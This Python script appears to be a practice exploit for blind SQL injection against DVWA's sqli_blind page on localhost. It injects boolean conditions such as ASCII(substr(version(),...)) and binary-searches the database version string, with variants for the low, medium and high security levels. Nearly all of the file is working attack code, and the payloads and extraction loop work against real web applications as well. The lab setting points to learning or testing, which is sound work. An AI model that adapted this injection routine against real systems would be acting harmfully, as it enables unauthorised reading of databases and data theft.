import requests
from itertools import cycle

url = 'http://127.0.0.1:8080/vulnerabilities/sqli_blind/'
fixed_query = "?Submit=Submit&id=1"
cookies = {
    'PHPSESSID': 'r0mns51mv27k5ot51g8fea50h1'
}

is_post = None

debug = True

def sql_inject(sqli_pt1, variable, sqli_pt2):
    next_url = url + fixed_query + sqli_pt1 + variable + sqli_pt2
    if debug:
        print(next_url)
    if not is_post:
        return requests.get(next_url, cookies=cookies)
    else:
        data = {
            "Submit" : "Submit",
            "id": "1" + sqli_pt1 + variable + sqli_pt2
        }
        cookies["id"] = data["id"]
        return requests.post(url, data=data, cookies=cookies)

def guess_len(guess_type, sqli_pt1, sqli_pt2):
    for i in range(100):
        response = sql_inject(sqli_pt1, str(i), sqli_pt2)
        if "MISSING" not in response.text:
            # print(response.text)
            return i
        
def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_intial):
    name = ""
    for i in range(1, name_len + 1):
        found_next_char = 0
        min_char = min_char_initial
        max_char = max_char_intial
        cur_char = (min_char + max_char) // 2

        comparison_types = cycle(['<', '>'])
        comparison = next(comparison_types)

        while found_next_char != 2:
            response = sql_inject(sqli_pt1 + str(i) + "," + "1))" + comparison, str(cur_char), sqli_pt2)
            if "MISSING" not in response.text:
                found_next_char = 0
                if comparison == ">":
                    min_char = cur_char + 1
                else:
                    max_char = cur_char - 1
                cur_char = (min_char + max_char) // 2
            else:
                comparison = next(comparison_types)
                found_next_char += 1
        name += chr(cur_char)
    return name

# Low
cookies['security'] = "low"
is_post=False
db_name_len = guess_len("DB Version Name Length: ", "' and length(version())=", "%23")
print(db_name_len)
db_name = guess_name("DB Version Name: ", "' and ASCII(substr(version(),", "%23", db_name_len, 20, 140)
print(db_name)

# Medium
cookies['security'] = "medium"
is_post=True
db_name_len = guess_len("DB Version Name Length: ", " and length(version())=", "")
print(db_name_len)
db_name = guess_name("DB Version Name: ", " and ASCII(substr(version(),", "", db_name_len, 20, 140)
print(db_name)

# High
cookies['security'] = "high"
is_post=True
db_name_len = guess_len("DB Version Name Length: ", "' and length(version())=", "#")
print(db_name_len)
db_name = guess_name("DB Version Name: ", "' and ASCII(substr(version(),", "#", db_name_len, 20, 140)
print(db_name)
